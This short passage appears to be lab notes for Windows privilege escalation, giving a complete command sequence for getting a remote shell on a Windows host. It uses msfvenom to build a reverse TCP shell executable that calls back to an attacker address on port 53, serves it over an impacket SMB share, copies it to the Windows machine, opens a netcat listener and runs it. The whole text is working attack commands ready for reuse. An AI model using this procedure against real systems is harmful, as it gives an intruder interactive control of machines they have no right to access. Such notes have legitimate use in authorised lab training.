### Generating a Reverse Shell Executable

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:
```JavaScript
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

On Kali, in the same directory as reverse.exe
```JavaScript
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On Windows (update the IP address with your Kali IP)
```JavaScript
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Setup netcat listener on Kali
```JavaScript
sudo nc -nvlp 53
```

Run reverse.exe on Windows
```JavaScript
C:\PrivEsc\reverse.exe
```
